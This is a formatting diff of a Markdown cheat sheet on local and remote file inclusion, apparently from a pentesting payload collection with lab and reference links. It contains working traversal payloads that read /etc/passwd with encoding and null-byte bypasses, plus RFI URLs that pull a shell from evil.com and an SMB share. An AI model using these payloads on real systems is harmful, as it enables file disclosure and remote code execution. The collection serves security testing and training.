@@ -18,15 +18,13 @@
 - [Labs](#labs)
 - [References](#references)
 
-
 ## Tools
 
-* [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
-* [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner
-* [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
-* [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
-* [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool
-
+- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
+- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner
+- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
+- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
+- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool
 
 ## Local File Inclusion
 
@@ -47,8 +45,6 @@ In the following examples we include the `/etc/passwd` file, check the `Director
 http://example.com/index.php?page=../../../etc/passwd
 ```
 
-
-
 ### Null Byte
 
 :warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).
@@ -63,14 +59,12 @@ http://example.com/index.php?page=../../../etc/passwd%00
 {{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
 ```
 
-
 ### Double Encoding
 
 ```powershell
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
-
 
 ### UTF-8 Encoding
 
@@ -98,7 +92,6 @@ http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 ```
 
-
 ## Remote File Inclusion
 
 > Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.
@@ -108,7 +101,6 @@ Remote File Inclusion doesn't work anymore on a default configuration since `all
 ```ini
 allow_url_include = On
 ```
-
 
 Most of the filter bypasses from LFI section can be reused for RFI.
 
@@ -122,13 +114,11 @@ http://example.com/index.php?page=http://evil.com/shell.txt
 http://example.com/index.php?page=http://evil.com/shell.txt%00
 ```
 
-
 ### Double Encoding
 
 ```powershell
 http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 ```
-
 
 ### Bypass allow_url_include
 
@@ -138,20 +128,18 @@ When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still pos
 2. Write a PHP code inside a file : `shell.php`
 3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
 
-
 ## Labs
 
-* [Root Me - Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
-* [Root Me - Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
-* [Root Me - Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
-* [Root Me - PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)
-
+- [Root Me - Local File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion)
+- [Root Me - Local File Inclusion - Double encoding](https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding)
+- [Root Me - Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)
+- [Root Me - PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)
 
 ## References
 
-* [CVV #1: Local File Inclusion - SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
-* [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux - 2019-05-12](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
-* [Is PHP vulnerable and under what conditions? - April 13, 2015 - Andreas Venieris](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
-* [LFI Cheat Sheet - @Arr0way - 24 Apr 2016](https://highon.coffee/blog/lfi-cheat-sheet/)
-* [Testing for Local File Inclusion - OWASP - 25 June 2017](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
-* [Turning LFI into RFI - Grayson Christopher - 2017-08-14](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)
+- [CVV #1: Local File Inclusion - SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
+- [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction - Mannu Linux - 2019-05-12](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
+- [Is PHP vulnerable and under what conditions? - April 13, 2015 - Andreas Venieris](http://0x191unauthorized.blogspot.fr/2015/04/is-php-vulnerable-and-under-what.html)
+- [LFI Cheat Sheet - @Arr0way - 24 Apr 2016](https://highon.coffee/blog/lfi-cheat-sheet/)
+- [Testing for Local File Inclusion - OWASP - 25 June 2017](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
+- [Turning LFI into RFI - Grayson Christopher - 2017-08-14](https://web.archive.org/web/20170815004721/https://l.avala.mp/?p=241)
